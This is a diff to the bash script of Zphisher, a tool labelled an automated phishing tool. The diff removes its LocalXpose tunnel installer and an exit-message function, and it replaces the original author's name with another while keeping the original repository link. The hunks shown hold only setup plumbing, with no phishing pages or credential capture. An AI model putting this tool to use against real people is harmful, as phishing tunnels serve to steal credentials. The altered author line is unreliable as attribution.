@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	Saqib Khan 
 ##   Version 	: 	2.3.5
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
@@ -122,9 +122,6 @@ else
 fi
 
 ## Remove logfile
-if [[ -e ".server/.loclx" ]]; then
-	rm -rf ".server/.loclx"
-fi
 
 if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
@@ -338,31 +335,7 @@ install_cloudflared() {
 	fi
 }
 
-## Install LocalXpose
-install_localxpose() {
-	if [[ -e ".server/loclx" ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
-	else
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
-		arch=`uname -m`
-		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
-		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
-		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
-		else
-			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
-		fi
-	fi
-}
 
-## Exit message
-msg_exit() {
-	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
-	{ reset_color; exit 0; }
-}
 
 ## About
 about() {
@@ -952,5 +925,4 @@ dependencies
 check_status
 install_ngrok
 install_cloudflared
-install_localxpose
 main_menu
